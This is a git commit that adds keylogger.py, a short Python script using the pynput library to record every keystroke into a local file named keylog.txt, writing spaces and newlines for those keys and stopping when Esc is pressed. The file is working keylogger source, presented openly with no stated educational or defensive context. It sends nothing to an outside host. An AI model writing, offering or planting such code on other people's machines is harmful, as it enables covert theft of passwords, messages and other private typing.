ff5b64c1df2a04357e921addaffb9a37c402d290
Sathwika akkala <168328158+SathwikaAkkala@users.noreply.github.com>
2024-07-20 21:01:02 +0530

    Add files via upload

---
+++ keylogger.py
@@ -0,0 +1,22 @@
+from pynput import keyboard
+
+def on_press(key):
+    try:
+        with open("keylog.txt", "a") as log_file:
+            log_file.write(f"{key.char}")
+    except AttributeError:
+        with open("keylog.txt", "a") as log_file:
+            if key == keyboard.Key.space:
+                log_file.write(" ")
+            elif key == keyboard.Key.enter:
+                log_file.write("\n")
+            else:
+                log_file.write(f"{key}")
+
+def on_release(key):
+    if key == keyboard.Key.esc:
+        # Stop listener
+        return False
+
+with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
